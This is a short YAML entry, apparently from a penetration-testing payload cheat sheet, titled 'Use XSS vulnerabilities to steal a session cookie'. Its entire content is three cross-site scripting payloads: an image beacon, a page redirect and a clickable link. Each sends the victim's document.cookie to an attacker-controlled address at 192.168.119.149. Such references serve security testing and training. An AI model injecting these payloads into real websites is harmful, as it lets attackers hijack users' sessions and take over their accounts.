---
description: Use XSS vulnerabilities to steal a session cookie
functions:
  gain-access:
    - description: cookie stealers
      code: |
        <script>new Image().src="http://192.168.119.149:9999/cool.jpg?output="+document.cookie;</script>
        <script>document.location='http://192.168.119.149/'+document.cookie;</script>
        <a onclick="document.location='http://192.168.119.149:8080/'+document.cookie;">Click me</a>
resources: |
  
---
